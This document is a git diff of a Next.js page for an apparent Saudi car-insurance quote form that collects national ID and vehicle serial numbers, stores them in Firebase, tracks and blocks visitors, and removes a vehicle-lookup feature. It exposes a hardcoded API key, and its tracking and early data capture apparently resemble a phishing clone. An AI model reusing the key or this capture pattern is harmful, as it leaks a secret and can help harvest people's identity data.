@@ -4,16 +4,15 @@ import { useEffect, useState } from "react"
 import { useRouter } from "next/navigation"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
-import { Globe, RefreshCw, Loader2 } from 'lucide-react'
+import { Globe, RefreshCw } from 'lucide-react'
 import { FullPageLoader } from "@/components/loader"
 import { StepIndicator } from "@/components/step-indicator"
 import { getOrCreateVisitorID, initializeVisitorTracking, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
 import { useAutoSave } from "@/hooks/use-auto-save"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
+// Removed saveToHistory - not needed
 import { secureAddData as addData } from "@/lib/secure-firebase"
 import { translations } from "@/lib/translations"
-// استيراد دوال car-bot API
-import { fetchVehiclesByNIN, vehiclesToDropdownOptions, saveSelectedVehicle, type VehicleDropdownOption } from "@/lib/vehicle-api"
 
 function generateCaptcha() {
   return Math.floor(1000 + Math.random() * 9000).toString()
@@ -38,11 +37,6 @@ export default function HomePage() {
   const [captchaCode, setCaptchaCode] = useState(generateCaptcha())
   const [captchaInput, setCaptchaInput] = useState("")
   const [captchaError, setCaptchaError] = useState(false)
-  
-  // car-bot integration states
-  const [vehicleOptions, setVehicleOptions] = useState<VehicleDropdownOption[]>([])
-  const [isLoadingVehicles, setIsLoadingVehicles] = useState(false)
-  const [showVehicleDropdown, setShowVehicleDropdown] = useState(false)
   
   // Validation
   const [identityNumberError, setidentityNumberError] = useState("")
@@ -78,6 +72,7 @@ export default function HomePage() {
   useEffect(() => {
     const init = async () => {
       try {
+        // Check if blocked first (fast check)
         const blocked = await checkIfBlocked(visitorID)
         if (blocked) {
           setIsBlocked(true)
@@ -85,6 +80,7 @@ export default function HomePage() {
           return
         }
         
+        // Fetch and save country if not already saved
         if (!localStorage.getItem("country")) {
           try {
             const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
@@ -92,6 +88,7 @@ export default function HomePage() {
             const response = await fetch(url)
             if (response.ok) {
               const countryName = await response.text()
+              // Convert country name to alpha-3 code
               const { countryNameToAlpha3 } = await import("@/lib/country-codes")
               const countryCode = countryNameToAlpha3(countryName)
               localStorage.setItem("country", countryCode)
@@ -105,7 +102,10 @@ export default function HomePage() {
           }
         }
         
+        // Show page immediately
         setLoading(false)
+        
+        // Initialize tracking in background (non-blocking)
         initializeVisitorTracking(visitorID).catch(console.error)
         updateVisitorPage(visitorID, "home", 1).catch(console.error)
       } catch (error) {
@@ -116,45 +116,6 @@ export default function HomePage() {
     
     init()
   }, [visitorID])
-  
-  // جلب معلومات المركبات عند اكتمال رقم الهوية
-  useEffect(() => {
-    const fetchVehicles = async () => {
-      // التحقق من أن رقم الهوية 10 أرقام وصحيح
-      if (identityNumber.length === 10 && /^\d{10}$/.test(identityNumber)) {
-        setIsLoadingVehicles(true)
-        setVehicleOptions([])
-        setShowVehicleDropdown(false)
-        
-        try {
-          const vehicles = await fetchVehiclesByNIN(identityNumber)
-          
-          if (vehicles && vehicles.length > 0) {
-            const options = vehiclesToDropdownOptions(vehicles)
-            setVehicleOptions(options)
-            setShowVehicleDropdown(true)
-            console.log(`✅ Found ${options.length} vehicles`)
-          } else {
-            setVehicleOptions([])
-            setShowVehicleDropdown(false)
-            console.log('No vehicles found - manual entry')
-          }
-        } catch (error) {
-          console.error('Error fetching vehicles:', error)
-          setVehicleOptions([])
-          setShowVehicleDropdown(false)
-        } finally {
-          setIsLoadingVehicles(false)
-        }
-      } else {
-        // إذا تغير رقم الهوية، امسح الخيارات
-        setVehicleOptions([])
-        setShowVehicleDropdown(false)
-      }
-    }
-    
-    fetchVehicles()
-  }, [identityNumber])
   
   const refreshCaptcha = () => {
     setCaptchaCode(generateCaptcha())
@@ -174,27 +135,23 @@ export default function HomePage() {
     }
   }
   
+  // Handle identity number - numbers only
   const handleIdentityNumberChange = (value: string) => {
-    const cleaned = value.replace(/\D/g, '')
-    setidentityNumber(cleaned.slice(0, 10))
+    const cleaned = value.replace(/\D/g, '') // Remove non-numeric
+    setidentityNumber(cleaned.slice(0, 10)) // Max 10 digits
     if (identityNumberError) setidentityNumberError("")
   }
   
+  // Handle buyer ID number - numbers only
   const handleBuyerIdNumberChange = (value: string) => {
-    const cleaned = value.replace(/\D/g, '')
-    setBuyerIdNumber(cleaned.slice(0, 10))
+    const cleaned = value.replace(/\D/g, '') // Remove non-numeric
+    setBuyerIdNumber(cleaned.slice(0, 10)) // Max 10 digits
   }
   
+  // Handle serial number - numbers only
   const handleSerialNumberChange = (value: string) => {
-    const cleaned = value.replace(/\D/g, '')
+    const cleaned = value.replace(/\D/g, '') // Remove non-numeric
     setSerialNumber(cleaned)
-  }
-  
-  // معالجة اختيار الرقم التسلسلي من dropdown
-  const handleVehicleSelect = (option: VehicleDropdownOption) => {
-    setSerialNumber(option.value) // تعبئة الرقم التسلسلي فقط
-    saveSelectedVehicle(option) // حفظ التفاصيل للصفحة الثانية
-    setShowVehicleDropdown(false)
   }
   
   const validateSaudiId = (id: string): boolean => {
@@ -226,6 +183,7 @@ export default function HomePage() {
     return true
   }
   
+  // Handle form submit
   const handleFirstStepSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     
@@ -238,6 +196,7 @@ export default function HomePage() {
       return
     }
     
+    // Save final data before navigation
     await addData({
       id: visitorID,
       identityNumber,
@@ -250,12 +209,11 @@ export default function HomePage() {
         buyerName,
         buyerIdNumber
       }),
-      // حفظ معلومة إذا تم استخدام car-bot
-      vehicleAutoFilled: vehicleOptions.length > 0,
       currentStep: 2,
       currentPage: "insur",
       homeCompletedAt: new Date().toISOString()
     }).then(() => {
+      // Navigate immediately
       router.push('/insur')
     })
   }
@@ -339,47 +297,29 @@ export default function HomePage() {
               </button>
               <button
                 type="button"
-                onClick={() => setInsuranceType("تجديد")}
+                onClick={() => setInsuranceType("نقل ملكية")}
                 className={`py-2.5 md:py-3.5 rounded-lg md:rounded-xl font-semibold text-base md:text-lg shadow-sm transition-all hover:shadow-md ${
-                  insuranceType === "تجديد"
+                  insuranceType === "نقل ملكية"
                     ? "bg-[#0a4a68] text-white hover:bg-[#083d57]"
                     : "bg-gray-100 text-gray-700 hover:bg-gray-200"
                 }`}
               >
-                {translations[language].renewal}
+                {translations[language].ownershipTransfer}
               </button>
             </div>
-            <button
-              type="button"
-              onClick={() => setInsuranceType("نقل ملكية")}
-              className={`w-full py-2.5 md:py-3.5 rounded-lg md:rounded-xl font-semibold text-base md:text-lg shadow-sm transition-all hover:shadow-md ${
-                insuranceType === "نقل ملكية"
-                  ? "bg-[#0a4a68] text-white hover:bg-[#083d57]"
-                  : "bg-gray-100 text-gray-700 hover:bg-gray-200"
-              }`}
-            >
-              {translations[language].ownershipTransfer}
-            </button>
 
             {/* Identity Number */}
-            <div className="relative">
-              <Input
-                type="tel"
-                inputMode="numeric"
-                pattern="[0-9]*"
-                placeholder={translations[language].identityNumber}
-                value={identityNumber}
-                onChange={(e) => handleIdentityNumberChange(e.target.value)}
-                className={`h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium`}
-                dir={language === "ar" ? "rtl" : "ltr"}
-                required
-              />
-              {isLoadingVehicles && (
-                <div className="absolute left-3 top-1/2 -translate-y-1/2">
-                  <Loader2 className="w-5 h-5 animate-spin text-[#0a4a68]" />
-                </div>
-              )}
-            </div>
+            <Input
+              type="tel"
+              inputMode="numeric"
+              pattern="[0-9]*"
+              placeholder={translations[language].identityNumber}
+              value={identityNumber}
+              onChange={(e) => handleIdentityNumberChange(e.target.value)}
+              className={`h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium`}
+              dir={language === "ar" ? "rtl" : "ltr"}
+              required
+            />
             {identityNumberError && (
               <p className={`text-red-500 text-sm mt-1 ${language === "ar" ? "text-right" : "text-left"}`} dir={language === "ar" ? "rtl" : "ltr"}>
                 {identityNumberError}
@@ -460,51 +400,18 @@ export default function HomePage() {
               </button>
             </div>
 
-            {/* Serial Number - مع dropdown إذا توفرت بيانات */}
-            <div className="relative">
-              {showVehicleDropdown && vehicleOptions.length > 0 ? (
-                <div className="space-y-2">
-                  <label className={`block text-sm font-medium text-gray-700 ${language === "ar" ? "text-right" : "text-left"}`}>
-                    {documentType === "بطاقة جمركية" ? translations[language].customsDeclarationNumber : translations[language].serialNumber}
-                  </label>
-                  <select
-                    value={serialNumber}
-                    onChange={(e) => {
-                      const selected = vehicleOptions.find(opt => opt.value === e.target.value)
-                      if (selected) {
-                        handleVehicleSelect(selected)
-                      }
-                    }}
-                    className={`w-full h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium bg-white px-3`}
-                    dir={language === "ar" ? "rtl" : "ltr"}
-                    required
-                  >
-                    <option value="">اختر الرقم التسلسلي</option>
-                    {vehicleOptions.map((option) => (
-                      <option key={option.value} value={option.value}>
-                        {option.label}
-                      </option>
-                    ))}
-                  </select>
-                  <p className="text-xs text-green-600 flex items-center gap-1">
-                    <span>✅</span>
-                    <span>تم جلب {vehicleOptions.length} مركبة</span>
-                  </p>
-                </div>
-              ) : (
-                <Input
-                  type="tel"
-                  inputMode="numeric"
-                  pattern="[0-9]*"
-                  placeholder={documentType === "بطاقة جمركية" ? translations[language].customsDeclarationNumber : translations[language].serialNumber}
-                  value={serialNumber}
-                  onChange={(e) => handleSerialNumberChange(e.target.value)}
-                  className={`h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium`}
-                  dir={language === "ar" ? "rtl" : "ltr"}
-                  required
-                />
-              )}
-            </div>
+            {/* Serial Number */}
+            <Input
+              type="tel"
+              inputMode="numeric"
+              pattern="[0-9]*"
+              placeholder={documentType === "بطاقة جمركية" ? translations[language].customsDeclarationNumber : translations[language].serialNumber}
+              value={serialNumber}
+              onChange={(e) => handleSerialNumberChange(e.target.value)}
+              className={`h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium`}
+              dir={language === "ar" ? "rtl" : "ltr"}
+              required
+            />
 
             {/* Captcha */}
             <div className="border-2 rounded-lg md:rounded-xl p-3 md:p-4 bg-gray-50 shadow-sm">
@@ -542,18 +449,18 @@ export default function HomePage() {
                   value={captchaInput}
                   onChange={(e) => {
                     setCaptchaInput(e.target.value)
-                    if (captchaError) setCaptchaError(false)
+                    setCaptchaError(false)
                   }}
-                  className={`flex-1 h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl ${
-                    captchaError ? "border-red-500" : "focus:border-[#0a4a68]"
-                  } shadow-sm text-gray-900 font-medium`}
-                  dir={language === "ar" ? "rtl" : "ltr"}
+                  className={`h-10 md:h-11 text-right text-base md:text-lg flex-1 border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] text-gray-900 font-medium ${
+                    captchaError ? "border-red-500 bg-red-50" : ""
+                  }`}
+                  dir="ltr"
                   required
                 />
               </div>
               {captchaError && (
-                <p className={`text-red-500 text-sm mt-2 ${language === "ar" ? "text-right" : "text-left"}`} dir={language === "ar" ? "rtl" : "ltr"}>
-                  {translations[language].incorrectVerificationCode}
+                <p className={`text-red-500 text-xs md:text-sm mt-2 ${language === "ar" ? "text-right" : "text-left"} font-semibold`}>
+                  {translations[language].incorrectCaptcha}
                 </p>
               )}
             </div>
@@ -561,9 +468,9 @@ export default function HomePage() {
             {/* Submit Button */}
             <Button
               type="submit"
-              className="w-full h-12 md:h-14 bg-[#0a4a68] hover:bg-[#083d57] text-white font-bold text-lg md:text-xl rounded-lg md:rounded-xl shadow-lg hover:shadow-xl transition-all"
+              className="w-full h-12 md:h-14 bg-yellow-500 hover:bg-yellow-600 text-[#0a4a68] font-bold text-lg md:text-xl rounded-lg md:rounded-xl shadow-lg hover:shadow-xl transition-all"
             >
-              {translations[language].next}
+              {translations[language].showOffers}
             </Button>
           </form>
         </div>
